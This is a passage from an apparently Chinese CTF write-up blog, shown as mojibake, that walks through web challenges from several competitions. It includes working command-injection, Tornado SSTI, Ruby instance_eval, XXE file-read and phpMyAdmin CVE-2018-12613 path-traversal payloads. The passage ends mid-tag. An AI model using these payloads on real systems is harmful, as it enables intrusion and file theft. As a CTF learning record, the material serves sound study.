¹æ®é¢˜ç›®æç¤ºï¼Œflag åœ¨ <code>/tmp/flag.php</code>ã€‚äºæ˜¯ç›´æ¥ä½¿ç”¨ <code>od</code> æ„é€ äº† <code>system(&quot;od -A d -c /tmp/flag.php&quot;)</code>ï¼Œå¾—åˆ°ç»“æœã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000 &lt; ? p h p \n e c h o &quot; d 3 3 p 0000016 &#123; f 4 s t _ C G 1 _ S S R F _ p 0000032 0 w 3 r ! ! &#125; &quot; ; \n 0000042</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¹‹åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;f4st_CG1_SSRF_p0w3r!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Did-You-Got-Trolled"><a href="#Did-You-Got-Trolled" class="headerlink" title="Did You Got Trolled?"></a>Did You Got Trolled?</h3><p>è¿™é¢˜æˆ‘æˆåŠŸåœ°è¢«ç»•äº†è¿›å»ï¼Œä»–ç»™äº†å¥½å¤šåŠ¨ç‰©çš„å«å£°ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯åŠ¨ç‰©å›­ã€‚è¿˜æœ‰é‚£ä¸ªå‡è£…å¯ä»¥æ³¨å…¥çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯å¾ˆå¥½ç¬‘ã€‚å…¶å®çœŸæ­£çš„è¦ç‚¹åœ¨æ‰¾åˆ°ä¸¤ä¸ª keyã€‚åœ¨å­¦é•¿çš„æç¤ºä¸‹ï¼Œæˆ‘åœ¨ <code>.../css/clean-blog.css</code> ä¸‹æ‰¾åˆ°äº† Key1ã€‚å…¶å®ä»–æ˜¯æœ‰ç»™æç¤ºçš„ï¼Œåªæœ‰é‚£ä¸€ä¸ªé¡µé¢å¼•å…¥äº†åŒæ ·çš„ä¸¤ä»½ CSSï¼Œä¸”é‡å¤çš„é‚£ä»½æ˜¯æ²¡æœ‰å‹ç¼©çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line"> * What is this doing here?</span><br><span class="line"> * Key1 &#x3D; gimme0x038792</span><br><span class="line"> * </span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çš„é‚£ä¸€ä»½å°±å¾—æ‰«ç›®å½•äº†ï¼Œæ˜¯åœ¨ <code>.../robots.txt</code> é‡Œé¢æœ‰ä¸ªæç¤ºï¼Œå†™ç€ <code>Disallow /deep.php</code>ã€‚è®¿é—®è¿™ä¸ªé¡µé¢å¯ä»¥å¾—åˆ°ä¸€ä¸ªæç¤ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MAINTENANCE</span><br><span class="line">loading...</span><br><span class="line">deep.php?page&#x3D;debug.html</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œç„¶åå†çœ‹ä¸€æ‰‹é¡µé¢æºç ï¼Œå¯ä»¥æ‰¾åˆ° <code>&lt;!--Creds in /home/ubuntu/key2.txt --&gt;</code> çš„æ³¨é‡Šã€‚äºæ˜¯æ„é€  <code>?page=/home/ubuntu/key2.txt</code> å¾—åˆ° Key2ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key2 &#x3D; flag0x085927</span><br></pre></td></tr></table></figure><p>å›åˆ° <code>.../post.html</code> æäº¤ä¸¤ä¸ª Keyï¼Œå¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D33P&#123;h3r3_1s_y0ur_7r0ll_fl4g&#125;</span><br></pre></td></tr></table></figure><h3 id="Greetings"><a href="#Greetings" class="headerlink" title="Greetings!"></a>Greetings!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SSTI</span></p><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œä¼ é€’ä¸€ä¸ª GET å‚æ•° <code>?name=you</code> å¯ä»¥å¾—åˆ° Hello you çš„åé¦ˆã€‚äºæ˜¯è¯•äº†ä¸€æ‰‹ <code>{{7 * 7}}</code> å¾—åˆ°äº† Hello 49 çš„åé¦ˆï¼Œå¯ä»¥ç¡®å®šæ˜¯ SSTI çš„è€ƒç‚¹ï¼Œç„¶åå‘ç°äº† tornadoã€‚é¡ºåŠ¿è¯•äº†ä¸‹ <code>?name={{__import__("os").popen("ls").read()}}</code> æ‰¾åˆ°äº† <code>flag.txt</code>ã€‚äºæ˜¯å†æ„é€  <code>cat flag.txt</code> å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;I_&lt;3_3000&#125;</span><br></pre></td></tr></table></figure><h3 id="Hack-MEEEE"><a href="#Hack-MEEEE" class="headerlink" title="Hack MEEEE"></a>Hack MEEEE</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">Ruby</span></p><p>ä¸Šæ¥å…ˆçœ‹äº†ä¸€æ‰‹è¿™é¢˜æºç ï¼Œæ‰¾åˆ°äº† <code> &lt;!-- This application is made using ruby! &lt;3 --&gt;</code> çš„æç¤ºï¼Œç„¶åå½“æ—¶è§¦åŠåˆ°äº†çŸ¥è¯†ç›²åŒºï¼Œå°±æ²¡ç®¡ã€‚å…¶å®ç¿»äº†ä¸€æ³¢æ‰‹å†Œå†æŸ¥äº†ä¸€ä¸‹ä¹‹åå‘ç°å¾ˆç®€å•ã€‚é¡µé¢è¯·æ±‚ä¼ é€’äº†ä¸¤ä¸ª POST å‚æ•°ã€‚è¿™é‡Œæœ‰ä¸ªå‘ï¼Œ<code>method</code> è¦æ”¾åœ¨å‰é¢ï¼Œä¸ç„¶ POST æœ¬èº«çš„æ¢è¡Œç¬¦åŠ ä¸Šä¹‹åå¯èƒ½ä¸ä¼šæœ‰æ­£ç¡®ç»“æœè¿”å›ã€‚ï¼ˆæŠ¥é”™åœ¨é¡µé¢æºç çš„æ³¨é‡Šä¸­å¯ä»¥çœ‹åˆ°ï¼‰</p><p>æŒ‰ç…§ Ruby çš„æ‰‹å†Œï¼Œä½¿ç”¨ <code>method=methods</code> å’Œ <code>method=private_methods</code> å¯ä»¥æŸ¥çœ‹å½“å‰ç±»ä¸‹åŒ…å«çš„æ–¹æ³•ã€‚äºæ˜¯æ‰¾åˆ°äº†å¯ä»¥åˆ©ç”¨çš„åå¼•å·ã€‚<a href="https://ruby-doc.org/core-2.2.0/Kernel.html#method-i-60">æ‰‹å†Œå‚è€ƒ</a>  ç»“åˆä¸Š <code>instance_eval</code> è¿™ä¸ªæ–¹æ³•å°±èƒ½è¾¾æˆç›®çš„ã€‚</p><p>å› æ­¤ï¼Œæ„é€  <code>method=instance_eval&message=`ls`</code> çš„ POST è¯·æ±‚å‚æ•°ï¼Œå¯ä»¥å¾—åˆ° flag.txt ä½äºå½“å‰ç›®å½•ä¸‹çš„çº¿ç´¢ï¼Œäºæ˜¯åªéœ€è¦å†æ„é€  <code>cat flag.txt</code> å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;send_is_a_very_dangerous_method&#125;</span><br></pre></td></tr></table></figure><hr><div style="pointer-events: none"><h2 style="display:none" id="TG:Hack">TG:Hack</h2><img src="https://ae01.alicdn.com/kf/H29783c4fda224c86816742291e422c4ei.png"/></div><h3 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h3><p>é¢˜ç›®ä¸€å¼€å§‹ï¼Œç»™äº† bank å’Œ store çš„ä¸¤ä¸ªé¡µé¢ï¼Œæˆ‘ä»¬çŸ¥é“â€œè¡¬è¡«çš„ä»·æ ¼æ˜¯ä¹é•‘åäº”ä¾¿å£«â€ã€‚å•Šï¼Œä¸æ˜¯ï¼Œæ˜¯äºŒåäº”ç¾å…ƒã€‚è¿™é¢˜å˜›ï¼Œå…¶å®ä¸èƒ½æŒ‰ç…§ä¸€èˆ¬æ€è·¯å»æƒ³ï¼Œä¸€å¼€å§‹æˆ‘åœ¨ bank é¡µé¢è¯•äº†å¥½ä¹…éƒ½åŠ ä¸ä¸Šé’±ï¼Œç„¶åå°±åªèƒ½å» store é¡µé¢æ‰¾ã€‚æ¯ä¹°ä¸€ä»¶ä¸œè¥¿éƒ½ä¼šä¼ é€’ä¸¤ä¸ª POST å‚æ•°ï¼Œåˆ†åˆ«æŒ‡ä»£ç‰©å“ç±»åˆ«å’Œé’±æ•°ã€‚æ‰€ä»¥ï¼ŒæŠŠé’±æ•°æƒ³åŠæ³•å˜æˆè´Ÿæ•°å°±å¯ä»¥ä»å•†åº—â€œç´¢è¦â€é‡‘é’±äº†ã€‚ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œä½¿ç”¨å·²ç»å­˜åœ¨çš„ç‰©å“ ID ä¸å¯ä¿¡ï¼Œæ‰€ä»¥å°±éšä¾¿æ•´ä¸ªå…¶ä»–çš„ ID å°±è¡Œã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ï¼ŒPOST å‚æ•°æœ€åçš„æ¢è¡Œç¬¦ä¼šæœ‰å½±å“ï¼ˆæ‰€ä»¥ HackBar ä¸è¡Œï¼‰ï¼Œæˆ‘ä½¿ç”¨æŸåœ¨çº¿çš„ POST å·¥å…·å°±æˆåŠŸè¾¾æˆç›®çš„äº†ã€‚æœ€åå°±å¯ä»¥ä¹°åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TG20&#123;I_just_want_to_buy_a_real_flag&#125;</span><br></pre></td></tr></table></figure><h3 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h3><p>è¿™é¢˜ï¼Œè¯´å®è¯æˆ‘å…¶å®æ²¡å¤ªçœ‹æ‡‚ã€‚é¦–å…ˆéšä¾¿å¡«ä¸€å¡«ä»–ç»™çš„è¡¨ï¼Œç„¶åæäº¤ï¼ŒConsole é‡Œå°±èƒ½çœ‹åˆ°ä¸€æ¡æ¶ˆæ¯ <code>The form has been submitted! Look at the Redux store!</code>ã€‚æˆ‘ä¸€å¼€å§‹ä¹Ÿæƒ³çŸ¥é“è¿™ä¸ª Redux store æŒ‡çš„æ˜¯å“ªé‡Œï¼Œä½†æ˜¯æ‰¾äº†å‡ ä¸‹æ²¡æ‰¾åˆ°ã€‚çœ‹åˆ°è¿™æ¡æ¶ˆæ¯æ˜¯æ¥è‡ª form.js çš„ï¼Œäºæ˜¯å°±é¡ºæ‰‹ç‚¹å¼€çœ‹äº†çœ‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mainReducer = <span class="function">(<span class="params">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_COLONIST_NUMBER:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;Payload is&quot;</span> + action.payload);</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">colonist_number</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_FIRST_NAME:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">firstName</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_LAST_NAME:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">lastName</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.ADD_FACTION:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">faction</span>: action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.SUBMIT_FORM:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;The form has been submitted! Look at the Redux store!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">submitted</span>: <span class="string">&quot;TG20&#123;always_disable_redux_dev_tools&#125;&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>äºæ˜¯å°±æ‰¾åˆ°äº† flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TG20&#123;always_disable_redux_dev_tools&#125;</span><br></pre></td></tr></table></figure><hr><div style="pointer-events: none"><h2 style="display:none" id="AUCTF">AUCTF</h2><img src="https://ae01.alicdn.com/kf/H77d23afec21d418db8da7ea3053610faz.png"/></div><h3 id="Miyazaki-Trivia"><a href="#Miyazaki-Trivia" class="headerlink" title="Miyazaki Trivia"></a>Miyazaki Trivia</h3><p>æ‰“å¼€é¡µé¢æœ‰ <code>Find this special file.</code> çš„æç¤ºï¼Œäºæ˜¯æ‰¾åˆ° <code>.../robots.txt</code>ã€‚æ‰“å¼€ä¹‹ååˆæ˜¯æ–°çš„æç¤º <code>VIDEO GAME TRIVIA: What is the adage of Byrgenwerth scholars? MAKE a GET request to this page with a header named &#39;answer&#39; to submit your answer.</code>ï¼ŒæŸ¥äº†ä¸€ä¸‹ä¹‹åå¾—åˆ°ç­”æ¡ˆï¼Œäºæ˜¯æ„é€  <code>?answer=Fear the Old Blood</code> å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;f3ar_z_olD3_8l0oD&#125;</span><br></pre></td></tr></table></figure><h3 id="Quick-Maths"><a href="#Quick-Maths" class="headerlink" title="Quick Maths"></a>Quick Maths</h3><p>è¿™é¢˜å…ˆéšä¾¿ç®—å‡ ä¸ªæ•°ï¼Œå‘ç°å¯ä»¥æ­£å¸¸ç®—å‡ºç»“æœã€‚ï¼ˆä¸å¤ªè®°å¾—äº†ï¼Œå†™çš„æ—¶å€™å¥½åƒç®—äº† 7 * 7 å•¥çš„ï¼Œå¾—åˆ°çš„éƒ½æ˜¯49ï¼‰äºæ˜¯é¡ºæ‰‹æ„é€ äº†ä¸ª <code>statement=system(&quot;ls&quot;)</code> ç„¶åå‘ç°æœ‰è¿”å›ç»“æœã€‚äºæ˜¯å°±å®‰æ’ä¸Š <code>statement=system(&quot;cat ./index.php&quot;)</code> å°±æ‹¿åˆ°äº† flagã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„è¯·æ±‚åŒ…éœ€è¦ç”¨ Burp Suite å‘é€æ‰èƒ½å¾—åˆ°è¿”å›çš„ç»“æœã€‚ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;p6p_1nj3c7i0n_iz_k:3w1&#125;</span><br></pre></td></tr></table></figure><h3 id="gg-no-re"><a href="#gg-no-re" class="headerlink" title="gg no re"></a>gg no re</h3><p>è¿™é¢˜ä¸€å¼€å§‹ç»™äº†ä¸ª authentication.jsï¼Œç•¥å¾®åˆ†æä¹‹åå¯ä»¥å‘ç°æ˜¯ Base64ï¼Œå–å‡ºå…³é”®ä¿¡æ¯ <code>TWFrZSBhIEdFVCByZXF1ZXN0IHRvIC9oaWRkZW4vbmV4dHN0ZXAucGhw</code>å†è§£ç ï¼Œå¾—åˆ° <code>Make a GET request to /hidden/nextstep.php</code>ã€‚æŒ‰ç…§æç¤ºè¿›è¡Œï¼Œåœ¨ Header ä¸­å¯ä»¥æ‰¾åˆ°ä¸‹ä¸€æ­¥çº¿ç´¢ï¼Œ<code>ROT13: Znxr n CBFG erdhrfg gb /ncv/svany. CuC</code>ã€‚ä½¿ç”¨å·¥å…·è§£å¯†ä¸€ä¸‹ï¼Œå¾—åˆ° <code>Make a POST request to /api/ final. PhP</code>ï¼Œæ¥ç€æŒ‰ç…§æç¤º <code>Send a request with the flag variable set</code> è¿›è¡Œï¼Œæ„é€  <code>?flag=1</code> å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;1_w@s_laZ_w1t_dis_0N3&#125;</span><br></pre></td></tr></table></figure><h3 id="API-madness"><a href="#API-madness" class="headerlink" title="API madness"></a>API madness</h3><p>æŒ‰ç…§æç¤ºè®¿é—® <code>.../static/help</code> å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ª APIã€‚å…ˆå°è¯•ä¸€ä¸‹ loginï¼Œè¿™é‡Œæœ‰ä¸ªå‘ï¼Œè¦ç”¨ curl å‘è¯·æ±‚æ‰èƒ½æˆåŠŸ <code>curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;username&quot;:&quot;lemon&quot;,&quot;password&quot;:&quot;password&quot;&#125;&#39; host/api/login</code>ï¼Œè€Œä¸”å“åº”çš„æ—¶é—´å¾ˆé•¿å¾ˆé•¿ï¼Œè¿”å›çš„æ•°æ®æ˜¯ä¸€ä¸ªæŠ¥é”™çš„é¡µé¢ï¼Œé‡Œé¢åŒ…å«äº†ä¸€ä¸ªä¸ä¸€æ ·çš„æ¥å£ <code>.../api/login_check</code>ã€‚curl è®¿é—®ä¹‹åå¾—åˆ°äº†ä¸€ä¸ªä¸º null çš„ tokenã€‚çœ‹èµ·æ¥åƒæ˜¯å‡çš„ä¸€æ ·ï¼Œä½†æ˜¯å°±åƒçˆ±æƒ…ï¼Œä½ ä¸å»å°è¯•æ€ä¹ˆçŸ¥é“ç»“æœå‘¢ï¼Ÿäºæ˜¯æŒ‰ç…§ API æ¥å£æ¥ç€å¾€å‰å†²ï¼Œæ„é€  <code>curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;dir&quot;:&quot;/&quot;,&quot;token&quot;:&quot;null&quot;&#125;&#39; host/api/ftp/dir</code>ï¼Œè¿”å›ç»“æœä¸­çœ‹åˆ°äº† flag.txtã€‚äºæ˜¯æ„é€  <code> curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;file&quot;:&quot;/flag.txt&quot;,&quot;token&quot;:&quot;null&quot;&#125;&#39; host/api/ftp/get_file</code> å¾—åˆ°ç»“æœã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;file_data&quot;: &quot;YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg&#x3D;&#x3D;\n&quot;,</span><br><span class="line">  &quot;status&quot;: &quot;OK&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å–å‡º <code>YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==</code> ä¹‹å Base64 è§£ç å³å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;0w@sp_6roK3N_@uth&#125;</span><br></pre></td></tr></table></figure><hr><div style="pointer-events: none"><h2 style="display:none" id="GWCTF-2019">GWCTF 2019</h2><img src="https://ae01.alicdn.com/kf/U4dcb925e60b64dd5a0f67b144894716aB.png"/></div><h3 id="æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h3><p>è¿™é¢˜ä¸Šæ¥å°±è¯´äº†æ•°æ®åº“ï¼Œä½†æ˜¯æ‰“å¼€é¡µé¢å‘ç°æ²¡å¾—å…¥å£ï¼Œåªæœ‰ä¸¤è¡Œå­—ã€‚äºæ˜¯å°è¯•æ‰¾äº†ä¸€ä¸‹ç‰¹æ®Šæ–‡ä»¶ï¼Œæ‰¾åˆ°äº† robots.txtã€‚æ–‡ä»¶é‡Œç»™äº†ä¸ª phpinfo.phpï¼Œä½†æ˜¯æ‰“å¼€ä¹‹åæ²¡æ‰¾åˆ°å•¥åˆ©ç”¨ç‚¹ã€‚ä½†æ˜¯ç”±äºè‡ªå·±æ­ç¯å¢ƒçš„æ—¶å€™å‡ºäº†äº›é—®é¢˜ï¼Œäºæ˜¯å»æŸ¥äº†ä¸€æ³¢ï¼Œå°±äº‹å…ˆçŸ¥é“äº†è¿™é¢˜æœ‰ä¸ª phpmyadminï¼Œå¦‚æœçœŸçš„æ‰“æ¯”èµ›ä¼°è®¡æ‰¾ä¸åˆ°è¿™ä¸ªç‚¹ã€‚ä¸è¿‡ä»–ç»™çš„ phpmyadmin å¾ˆå¥‡æ€ªï¼Œä¸éœ€è¦ç™»å½•å°±èƒ½æ“ä½œæ•°æ®åº“ã€‚äºæ˜¯å°±å»æŸ¥äº†ä¸€æ³¢ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼Œæ‰¾åˆ°äº† <a href="https://blog.csdn.net/qq_33020901/article/details/80829269">CVE-2018-12613</a>ã€‚</p><p>äºæ˜¯ç…§ç€æ•™ç¨‹ï¼Œæ„é€  <code>.../index.php?target=db_events.php%3f/../../../../../flag</code> å°±èƒ½å¤ŸåŒ…å«åˆ°åœ¨æ ¹ç›®å½•çš„ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gwctf&#123;JUst_q_1I111l1Il11DAYS&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¯ç‡¥çš„æŠ½å¥–"><a href="#æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="æ¯ç‡¥çš„æŠ½å¥–"></a>æ¯ç‡¥çš„æŠ½å¥–</h3><p>é¡µé¢ç»™äº†åä¸ªéšæœºå­—æ¯ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å¯ä»¥å‘ç°ä¸€ä¸ª check.phpï¼Œè®¿é—®ä¹‹åå¯ä»¥æ‹¿åˆ°éšæœºæ•°ç”Ÿæˆçš„æ–¹æ³•ï¼ŒæŒ‰ç…§ <a href="https://lemonprefect.cn/posts/78cb5320/#Ezaudit">MRCTF-Ezaudit</a> çš„å¥—è·¯ç”¨ php_mt_seed è¿™ä¸ªå·¥å…·ç®—ä¸€æ³¢éšæœºæ•°ç§å­ï¼Œç„¶åå†ç”¨ PHP ç”Ÿæˆåé¢åä½å°±è¡Œäº†ã€‚è¿™é‡Œè¸©äº†ä¸€ä¸ªå‘ï¼Œå·¥å…·çš„ç‰ˆæœ¬å¾ˆé‡è¦ï¼Œæˆ‘ä¹‹å‰ä½¿ç”¨çš„é‚£ä¸ªåœ¨è¿™é¢˜ç®—ä¸å‡ºæ¥è€Œä¸”èƒ½ç®—å‡ºæ¥çš„ä¹Ÿä¸ä¼šå‘ŠçŸ¥ PHP çš„ç‰ˆæœ¬å·ã€‚è‡³äºç”Ÿæˆé€‚åˆå·¥å…·ä½¿ç”¨çš„å‚æ•°æ ¼å¼å˜›ï¼Œæˆ‘å†™äº†ä¸€æ®µ PHP ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = str_split(<span class="string">&quot;oS668h2wc9&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$key</span> <span class="keyword">as</span> <span class="variable">$i</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> strpos(<span class="variable">$str</span>,<span class="variable">$i</span>) . <span class="string">&quot; &quot;</span> . strpos(<span class="variable">$str</span>,<span class="variable">$i</span>) . <span class="string">&quot; 0 &quot;</span> . <span class="string">&quot;61 &quot;</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœå‰é¢çš„æ­¥éª¤éƒ½æ²¡æœ‰é”™ï¼Œç®—å‡ºæ¥çš„éšæœºæ•°ç§å­åº”è¯¥æ˜¯ <code>951373997</code>ã€‚æ”¾åˆ°ç»™å‡ºçš„æºç ä¸­ç„¶åè§£é™¤ 10 ä½çš„é™åˆ¶ï¼Œå¯ä»¥å¾—åˆ°äºŒåä½çš„å­—ç¬¦ä¸² <code>oS668h2wc93iAcrwCuZQ</code>ã€‚æäº¤åˆ°é¡µé¢ä¸Šå³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_wIN_abcdefghijklmnopqrstuvwxyz&#125;</span><br></pre></td></tr></table></figure><p>(åé¢çš„é¢˜ç›®ç¯å¢ƒæ­å¥½äº† é¢˜ç›®å¥½åƒå¾ˆé¡¶  è®©æˆ‘æ…¢æ…¢å†™ä¸€æ³¢)</p><div style="pointer-events: none"><h2 style="display:none" id="Sharky-CTF-2020">Sharky CTF 2020</h2><img src="https://ae01.alicdn.com/kf/Ucf1568c6275645d9b215b1d9e92a7711j.jpg"/></div><h3 id="XXExternalXX"><a href="#XXExternalXX" class="headerlink" title="XXExternalXX"></a>XXExternalXX</h3><p>ä¸Šæ¥ç‚¹ Show stored data æ¢ç´¢ä¸€æ³¢ï¼Œæ³¨æ„åˆ°äº†åœ°å€æ çš„ <code>?xml=data.xml</code> å¯Ÿè§‰åˆ°å¯èƒ½æ˜¯ XXEã€‚éšä¾¿å¡«å……ä¹‹ååœ¨æŠ¥é”™é‡Œå‘ç°äº† <code>Trying to get property &#39;data&#39; of non-object</code>ï¼Œäºæ˜¯æ ¹æ®é¢˜ç›®æè¿°é¡ºæ‰‹æ„é€ ä¸€æ³¢ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Lemon</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">flag</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºæ˜¯ä¸ª GET å‚æ•°ï¼Œæ‰€ä»¥å¾—æƒ³åŠæ³•ç»™æ„é€ çš„ payload ä¸€ä¸ªç›´é“¾æ‰èƒ½æˆåŠŸï¼Œè¾¾æˆä¹‹åå¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a&#125; </span><br></pre></td></tr></table></figure><h3 id="Logs-In-Part-1"><a href="#Logs-In-Part-1" class="headerlink" title="Logs In ! Part 1"></a>Logs In ! Part 1</h3><p>è¿™é¢˜åƒä¸‡ä¸è¦è¢«æ ‡é¢˜è¿·æƒ‘ï¼Œè®¿é—®é¡µé¢ä¹‹åå¯ä»¥åœ¨å·¦ä¸‹è§’æ‰¾åˆ° Controller çš„é¡µé¢ï¼Œé¡ºæ‰‹è®¿é—®ä¸€æ³¢ä¹‹åå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªè·¯ç”±ï¼Œè®¿é—®å…¶ä¸­ä¸€ä¸ª <code>/e48e13207341b6bffb7fb1622282247b/debug</code> å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 